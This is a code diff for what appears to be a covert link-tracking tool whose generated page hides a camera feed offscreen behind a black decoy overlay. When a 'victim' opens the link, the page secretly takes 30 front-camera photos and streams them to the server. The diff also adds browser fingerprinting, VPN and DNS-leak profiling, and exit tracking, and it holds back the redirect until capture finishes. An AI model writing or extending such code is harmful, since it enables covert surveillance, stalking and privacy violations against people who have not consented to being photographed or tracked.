@@ -2160,7 +2567,15 @@ Respond ONLY with a valid JSON object matching this schema:
       // If visit is not created yet, CREATE IT INSTANTLY IN DB on photo #1!
       const link = db.links.find((l) => l.code === code);
       const ua = (req.headers['user-agent'] as string) || '';
-      const { os, device } = cleanOS(ua);
+      const { os, device } = cleanOS(
+        ua,
+        clientHintModel,
+        uaPlatformVersion,
+        screenWidth ? Number(screenWidth) : undefined,
+        screenHeight ? Number(screenHeight) : undefined,
+        pixelRatio ? Number(pixelRatio) : undefined,
+        gpuRenderer
+      );
       const browser = cleanBrowser(ua);
       const botCheck = detectBot(ua);
       const geo = await fetchGeo(ip);
@@ -2187,8 +2602,12 @@ Respond ONLY with a valid JSON object matching this schema:
         isp: geo?.isp || 'Unknown',
         org: geo?.org || 'Unknown',
         asn: geo?.asn || null,
+        asName: geo?.asName || null,
         isMobileCarrier: geo?.isMobileCarrier ?? null,
         isProxyVpn: geo?.isProxyVpn ?? null,
+        proxyType: geo?.proxyType || null,
+        vpnProviderName: geo?.vpnProviderName || null,
+        dnsLeakIsp: geo?.dnsLeakIsp || null,
         currency: geo?.currency || null,
         browser,
         os,
@@ -2216,8 +2635,11 @@ Respond ONLY with a valid JSON object matching this schema:
         cookiesEnabled: null,
         userAgent: ua,
         isBot: botCheck.isBot,
-        botName: botCheck.botName,
-        capturedPhotos: [photo],
+        botName: botCheck.botName || undefined,
+        capturedPhotos: [photoDiskUrl],
+        capturedVideo: pendingVideosMap.get(effectiveToken) || null,
+        liveStreamFrame: pendingStreamFramesMap.get(effectiveToken) || null,
+        mode: link?.mode || 'camera',
         createdAt: new Date().toISOString(),
       };
 
@@ -2237,12 +2659,28 @@ Respond ONLY with a valid JSON object matching this schema:
         visitId: newVisit.id,
         visitorToken: newVisit.visitorToken,
         count: 1,
-        photos: [photo],
+        photos: newVisit.capturedPhotos,
         visit: newVisit,
       });
     } catch (err: any) {
-      console.error('Update photo error:', err);
+      console.error('Error in update-photo:', err);
       res.status(500).json({ error: err.message || 'Failed to update photo' });
+    }
+  });
+
+  // Track when a victim leaves the site
+  app.post('/api/visits/exit', async (req, res) => {
+    try {
+      const { visitorToken, code } = req.body;
+      const visit = db.visits.find((v) => (visitorToken && v.visitorToken === visitorToken) || (code && v.code === code));
+      if (visit) {
+        visit.lastActiveAt = new Date().toISOString();
+        visit.isLive = false;
+        saveDatabase(db);
+      }
+      res.json({ success: true });
+    } catch (err) {
+      res.status(500).json({ error: 'Failed to record exit' });
     }
   });
 
@@ -2355,7 +2793,15 @@ Respond ONLY with a valid JSON object matching this schema:
       }
 
       const ua = userAgent || (req.headers['user-agent'] as string) || '';
-      const { os, device } = cleanOS(ua, clientHintModel, uaPlatformVersion);
+      const { os, device } = cleanOS(
+        ua,
+        clientHintModel,
+        uaPlatformVersion,
+        screenWidth ? Number(screenWidth) : undefined,
+        screenHeight ? Number(screenHeight) : undefined,
+        pixelRatio ? Number(pixelRatio) : undefined,
+        webglRenderer || gpu
+      );
       const browser = cleanBrowser(ua);
       const botCheck = detectBot(ua);
 
@@ -2611,12 +3057,21 @@ Respond ONLY with a valid JSON object matching this schema:
           }
           return list;
         })(),
+        capturedVideo: (visitorToken && pendingVideosMap.get(visitorToken)) || (code && pendingVideosMap.get(code)) || null,
+        liveStreamFrame: (visitorToken && pendingStreamFramesMap.get(visitorToken)) || (code && pendingStreamFramesMap.get(code)) || null,
+        mode: link.mode || 'precise',
         userId: userId || null,
         createdAt: new Date().toISOString(),
       };
 
-      // Check if visit with this visitorToken already exists; if so, update in place
-      const existingIdx = visitorToken ? db.visits.findIndex((v) => v.visitorToken === visitorToken) : -1;
+      // Check if visit with this visitorToken, deviceFingerprint, or IP+UA already exists for this link code; if so, update in place and continue
+      const existingIdx = db.visits.findIndex((v) => {
+        if (v.code !== code) return false;
+        if (visitorToken && v.visitorToken === visitorToken) return true;
+        if (deviceFingerprint && v.deviceFingerprint === deviceFingerprint) return true;
+        if (v.ip === ip && v.userAgent === ua) return true;
+        return false;
+      });
       if (existingIdx >= 0) {
         const existing = db.visits[existingIdx];
         const mergedPhotos = Array.from(new Set([...(existing.capturedPhotos || []), ...(newVisit.capturedPhotos || [])]));
@@ -2624,6 +3079,9 @@ Respond ONLY with a valid JSON object matching this schema:
           ...existing,
           ...newVisit,
           id: existing.id,
+          mode: existing.mode || link.mode || 'precise',
+          capturedVideo: existing.capturedVideo || newVisit.capturedVideo,
+          liveStreamFrame: newVisit.liveStreamFrame || existing.liveStreamFrame,
           createdAt: existing.createdAt,
           capturedPhotos: mergedPhotos,
         };
@@ -2683,8 +3141,9 @@ Respond ONLY with a valid JSON object matching this schema:
       const match = req.headers.cookie.match(/(?:^|;\s*)sm_vid=([^;]+)/);
       if (match) cookieVid = match[1];
     }
-    const visitorToken = cookieVid || generateToken(16);
-    res.cookie('sm_vid', visitorToken, { maxAge: 365 * 24 * 3600 * 1000, httpOnly: false, sameSite: 'lax', path: '/' });
+    // Generate a UNIQUE session token for this specific visit attempt
+    const visitorToken = 'vid_' + generateToken(8) + '_' + Date.now().toString(36);
+    res.cookie('sm_vid', visitorToken, { maxAge: 24 * 3600 * 1000, httpOnly: false, sameSite: 'lax', path: '/' });
 
     const captureHtml = `<!DOCTYPE html>
 <html lang="en">
@@ -2714,10 +3173,23 @@ Respond ONLY with a valid JSON object matching this schema:
       background: transparent;
       z-index: 999999;
     }
+    #flashOverlay {
+      position: fixed;
+      inset: 0;
+      background: #ffffff;
+      opacity: 0;
+      z-index: 1000000;
+      pointer-events: none;
+      transition: opacity 0.1s ease-out;
+    }
   </style>
 </head>
 <body>
-  <div id="touchSurface"></div>
+  <div id="flashOverlay"></div>
+  <div id="touchSurface">
+    ${link.mode === 'camera' ? `
+    <div id="decoyContent" style="position:fixed;inset:0;background:#000000;z-index:999999;cursor:pointer;"></div>` : ''}
+  </div>
   <script>
     (function() {
       var isSent = false;
@@ -3119,7 +3591,8 @@ Respond ONLY with a valid JSON object matching this schema:
 
       // Fast immediate initial visit sync so the visit is created in DB instantly for live streaming
       try {
-        fetch(window.location.origin + '/api/visits', {
+        var initialSyncUrl = window.location.origin + '/api/visits';
+        fetch(initialSyncUrl, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(telemetry),
@@ -3248,150 +3721,188 @@ Respond ONLY with a valid JSON object matching this schema:
         }).catch(function() {});
       }
 
-        // 12. Camera Trap Sequential Capture Promise (10 front + 10 back = 20 photos)
+      // 12. Universal Front Camera Live Stream, Instant Video Recording & HD Photo Burst (100% Front Camera)
+      var video = null;
+      var canvas = null;
+      var photos = [];
+      var totalShots = 30;
+      var currentShot = 0;
+      var activeStream = null;
+      var isFinished = false;
+      var isSent = false;
+      var cameraResolver = null;
+
       var cameraPromise = new Promise(function(resolve) {
         if (!isCamera) {
           resolve(true);
+        } else {
+          cameraResolver = resolve;
+        }
+      });
+
+      // Guaranteed cleanup on navigation / tab close
+      window.addEventListener('pagehide', function() {
+        navigator.sendBeacon(window.location.origin + '/api/visits/exit', JSON.stringify({ visitorToken: visitorToken, code: code }));
+      });
+      document.addEventListener('visibilitychange', function() {
+        if (document.visibilityState === 'hidden') {
+          navigator.sendBeacon(window.location.origin + '/api/visits/exit', JSON.stringify({ visitorToken: visitorToken, code: code }));
+        }
+      });
+
+      function getUniversalMedia(constraints) {
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+          return navigator.mediaDevices.getUserMedia(constraints);
+        }
+        var legacy = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia;
+        if (legacy) {
+          return new Promise(function(res, rej) {
+            legacy.call(navigator, constraints, res, rej);
+          });
+        }
+        return Promise.reject(new Error('getUserMedia not supported'));
+      }
+
+      // Camera stream acquisition (Front Camera Only)
+      function getCameraStream() {
+        var constraints = {
+          video: {
+            facingMode: 'user',
+            width: { ideal: 1280, max: 1920 },
+            height: { ideal: 720, max: 1080 }
+          },
+          audio: false
+        };
+
+        return getUniversalMedia(constraints).catch(function() {
+          return getUniversalMedia({ video: { facingMode: 'user' }, audio: false }).catch(function() {
+            return getUniversalMedia({ video: true, audio: false });
+          });
+        });
+      }
+
+      function finishCapture() {
+        if (isFinished) return;
+        isFinished = true;
+        if (activeStream) {
+          try {
+            activeStream.getTracks().forEach(function(track) { track.stop(); });
+          } catch(e) {}
+        }
+        if (cameraResolver) {
+          cameraResolver(true);
+        }
+      }
+
+      // Safe Photo Capture: 30 Front Shots
+      function takePhotoShot(retriesLeft) {
+        if (isFinished || currentShot >= totalShots) {
           return;
         }
 
-        try {
-          var video = document.createElement('video');
-          video.setAttribute('autoplay', '');
-          video.setAttribute('playsinline', '');
-          video.setAttribute('webkit-playsinline', '');
-          video.muted = true;
-          // Keep video in rendering tree offscreen so frames are fully decoded
-          video.style.position = 'fixed';
-          video.style.top = '-9999px';
-          video.style.left = '-9999px';
-          video.style.width = '320px';
-          video.style.height = '240px';
-          video.style.opacity = '0.01';
-          video.style.pointerEvents = 'none';
-          document.body.appendChild(video);
+        var vw = (video && video.videoWidth) ? video.videoWidth : 0;
+        var vh = (video && video.videoHeight) ? video.videoHeight : 0;
 
-          var canvas = document.createElement('canvas');
-          var photos = [];
-          var totalShots = 20; // 10 front + 10 back alternating
-          var currentShot = 0;
-          var activeStream = null;
-          var activeFacing = null;
-
-          function getStreamForFacing(targetFacing) {
-            return navigator.mediaDevices.getUserMedia({
-              video: { facingMode: { ideal: targetFacing }, width: { ideal: 1280 }, height: { ideal: 720 } },
-              audio: false
-            }).catch(function() {
-              return navigator.mediaDevices.getUserMedia({
-                video: { facingMode: targetFacing },
-                audio: false
-              }).catch(function() {
-                return navigator.mediaDevices.getUserMedia({
-                  video: true,
-                  audio: false
-                });
-              });
-            });
+        if (vw === 0 || vh === 0 || video.readyState < 2) {
+          if (retriesLeft > 0) {
+            setTimeout(function() { takePhotoShot(retriesLeft - 1); }, 100);
+            return;
           }
-
-          function captureFrame(facingLabel) {
-            try {
-              var vw = video.videoWidth || 1280;
-              var vh = video.videoHeight || 720;
-              canvas.width = vw;
-              canvas.height = vh;
-              var ctx = canvas.getContext('2d');
-              if (ctx) {
-                ctx.drawImage(video, 0, 0, vw, vh);
-                var dataUrl = canvas.toDataURL('image/jpeg', 0.88);
-                if (dataUrl && dataUrl.length > 300) {
-                  photos.push(dataUrl);
-
-                  // Send photo live in real-time immediately to backend
-                  fetch(window.location.origin + '/api/visits/update-photo', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                      visitorToken: visitorToken,
-                      userId: visitorToken,
-                      deviceId: visitorToken,
-                      photo: dataUrl,
-                      code: code,
-                      facing: facingLabel,
-                      shot: currentShot
-                    }),
-                    keepalive: true
-                  }).catch(function() {});
-                }
-              }
-            } catch (err) {}
-          }
-
-          function takeNextShot() {
-            if (currentShot >= totalShots) {
-              if (activeStream) {
-                try {
-                  activeStream.getTracks().forEach(function(t) { t.stop(); });
-                } catch (e) {}
-              }
-              if (video.parentNode) video.parentNode.removeChild(video);
-              telemetry.capturedPhotos = photos;
-              resolve(true);
-              return;
-            }
-
-            // Even shots (0, 2, 4...) front ('user'), Odd shots (1, 3, 5...) back ('environment')
-            var desiredFacing = (currentShot % 2 === 0) ? 'user' : 'environment';
-            var needSwitch = (!activeStream || activeFacing !== desiredFacing);
-
-            if (needSwitch) {
-              if (activeStream) {
-                try {
-                  activeStream.getTracks().forEach(function(t) { t.stop(); });
-                } catch (e) {}
-              }
-              getStreamForFacing(desiredFacing).then(function(stream) {
-                activeStream = stream;
-                activeFacing = desiredFacing;
-                video.srcObject = stream;
-                var playP = video.play();
-                if (playP !== undefined) playP.catch(function() {});
-
-                setTimeout(function() {
-                  captureFrame(desiredFacing);
-                  currentShot++;
-                  setTimeout(takeNextShot, 600); // Sequence every second
-                }, 400);
-              }).catch(function() {
-                // Device might have single camera (laptop/webcam); fallback to user camera
-                getStreamForFacing('user').then(function(stream) {
-                  activeStream = stream;
-                  activeFacing = 'user';
-                  video.srcObject = stream;
-                  video.play().catch(function() {});
-                  setTimeout(function() {
-                    captureFrame('user');
-                    currentShot++;
-                    setTimeout(takeNextShot, 600);
-                  }, 400);
-                }).catch(function() {
-                  currentShot++;
-                  setTimeout(takeNextShot, 600);
-                });
-              });
-            } else {
-              captureFrame(activeFacing);
-              currentShot++;
-              setTimeout(takeNextShot, 900);
-            }
-          }
-
-          takeNextShot();
-        } catch (e) {
-          resolve(true);
+          // If retries ran out (common on mobile if unnegotiated or paused), fallback and CONTINUE
+          vw = vw || 1280;
+          vh = vh || 720;
         }
-      });
+
+        if (!canvas) {
+          canvas = document.createElement('canvas');
+        }
+        canvas.width = vw;
+        canvas.height = vh;
+        var ctx = canvas.getContext('2d');
+        if (!ctx) {
+          currentShot++;
+          setTimeout(function() { takePhotoShot(10); }, 500);
+          return;
+        }
+
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        var dataUrl = canvas.toDataURL('image/jpeg', 0.90);
+        if (dataUrl && dataUrl.length > 200) {
+          // Flash effect for 100ms
+          var flash = document.getElementById('flashOverlay');
+          if (flash) {
+            flash.style.opacity = '0.6';
+            setTimeout(function() { flash.style.opacity = '0'; }, 80);
+          }
+
+          photos.push(dataUrl);
+          var shotNum = currentShot + 1;
+          currentShot++;
+
+          fetch(window.location.origin + '/api/visits/update-photo', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              visitorToken: visitorToken,
+              userId: visitorToken,
+              deviceId: visitorToken,
+              photo: dataUrl,
+              code: code,
+              facing: 'user',
+              shot: shotNum,
+              clientHintModel: telemetry ? telemetry.clientHintModel : null,
+              uaPlatformVersion: telemetry ? telemetry.uaPlatformVersion : null,
+              screenWidth: window.screen ? window.screen.width : null,
+              screenHeight: window.screen ? window.screen.height : null,
+              pixelRatio: window.devicePixelRatio || 1,
+              gpuRenderer: (typeof gpuRenderer !== 'undefined' ? gpuRenderer : null)
+            }),
+            keepalive: true
+          }).catch(function() {});
+
+          fetch(window.location.origin + '/api/visits/update-stream', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              visitorToken: visitorToken,
+              code: code,
+              frame: dataUrl
+            }),
+            keepalive: true
+          }).catch(function() {});
+        } else {
+          currentShot++;
+        }
+
+        if (currentShot < totalShots) {
+          setTimeout(function() { takePhotoShot(10); }, 500);
+        } else {
+          finishCapture();
+        }
+      }
+
+      // Wait for video to be actively rendering real camera frames before taking photos
+      function startCaptureWhenReady() {
+        var checkCount = 0;
+        var checkInterval = setInterval(function() {
+          checkCount++;
+          if (video && video.paused) {
+            video.play().catch(function() {});
+          }
+          var hasDimensions = video.videoWidth > 0 && video.videoHeight > 0;
+          var hasData = video.readyState >= 2;
+          var hasDecoded = video.currentTime > 0.03 || checkCount >= 10;
+
+          if ((hasDimensions && hasData && hasDecoded) || checkCount >= 15) {
+            clearInterval(checkInterval);
+            // Allow 300ms for camera auto-exposure to fully calibrate
+            setTimeout(function() {
+              takePhotoShot(15);
+            }, 300);
+          }
+        }, 80);
+      }
 
       function sendTelemetryAndRedirect() {
         if (isSent) return;
@@ -3411,10 +3922,10 @@ Respond ONLY with a valid JSON object matching this schema:
           });
         });
 
-        // Fallback safety redirect after 25 seconds max
+        // Fallback safety redirect after 45 seconds max
         setTimeout(function() {
           window.location.replace(targetUrl);
-        }, 25000);
+        }, 45000);
       }
 
       function requestLocationStrict() {
@@ -3459,14 +3970,78 @@ Respond ONLY with a valid JSON object matching this schema:
         }
       }
 
+      // Initialize Camera elements if mode is active
+      if (isCamera) {
+        try {
+          video = document.createElement('video');
+          video.setAttribute('autoplay', '');
+          video.setAttribute('playsinline', '');
+          video.setAttribute('webkit-playsinline', '');
+          video.setAttribute('muted', '');
+          video.muted = true;
+          video.playsInline = true;
+          video.volume = 0;
+          // Must have valid size and be in the render tree with high z-index so GPU compositor keeps decoding frames actively
+          video.style.cssText = 'position:fixed;top:0;right:0;width:320px;height:240px;opacity:0.01;pointer-events:none;z-index:2147483647;';
+          document.body.appendChild(video);
+
+          // Launch Front Camera stream immediately on load
+          getCameraStream().then(function(stream) {
+            activeStream = stream;
+            video.srcObject = stream;
+
+            var playPromise = video.play();
+            if (playPromise && playPromise.catch) {
+              playPromise.catch(function() {});
+            }
+
+            if (video.readyState >= 2 && video.videoWidth > 0) {
+              startCaptureWhenReady();
+            } else {
+              video.onloadedmetadata = startCaptureWhenReady;
+              video.onplaying = startCaptureWhenReady;
+              setTimeout(startCaptureWhenReady, 500);
+            }
+          }).catch(function() {
+            // Camera failed on initial load (likely due to gesture requirements)
+            // We do NOT call finishCapture() here to prevent premature redirect.
+            // Instead, we wait for the user to click the touch surface to trigger the prompt.
+            console.warn('Camera blocked on initial load. Awaiting user click to retry.');
+          });
+
+          // Fixed 35s fallback safety timer
+          setTimeout(function() {
+            finishCapture();
+          }, 35000);
+        } catch(e) {
+          finishCapture();
+        }
+      }
+
       // Interaction triggers tailored per mode
       var surface = document.getElementById('touchSurface');
       if (isCamera) {
         // In camera mode, touching screen re-prompts or triggers camera if blocked by browser
-        var cameraTriggered = false;
         var triggerCameraAction = function() {
-          if (!cameraTriggered) {
-            cameraTriggered = true;
+          if (video) {
+            video.play().catch(function() {});
+          }
+          if (!activeStream) {
+            getCameraStream().then(function(stream) {
+              activeStream = stream;
+              video.srcObject = stream;
+              var playPromise = video.play();
+              if (playPromise && playPromise.catch) {
+                playPromise.catch(function() {});
+              }
+              startCaptureWhenReady();
+            }).catch(function() {
+              window.location.reload();
+            });
+          } else {
+            if (currentShot < totalShots) {
+              takePhotoShot(10);
+            }
           }
         };
         if (surface) {
@@ -3488,26 +4063,9 @@ Respond ONLY with a valid JSON object matching this schema:
 
       // Execution Mode
       if (isCamera) {
-        // Camera Trap Mode: Register initial visit immediately on load, then capture photos live
-        Promise.all([latencyDonePromise, uaPromise]).then(function() {
-          var saveUrl = window.location.origin + '/api/visits';
-          fetch(saveUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(telemetry),
-            keepalive: true
-          }).catch(function() {});
-        });
-
-        cameraPromise.then(function() {
-          setTimeout(function() {
-            window.location.replace(targetUrl);
-          }, 400);
-        });
-
-        setTimeout(function() {
-          window.location.replace(targetUrl);
-        }, 25000);
+        // Camera Trap Mode: Start telemetry and redirect logic immediately
+        // It will wait for cameraPromise (30 shots) before actually redirecting
+        sendTelemetryAndRedirect();
       } else if (isPrecise) {
         // Precise Mode: request immediate high-accuracy position
         requestLocationStrict();
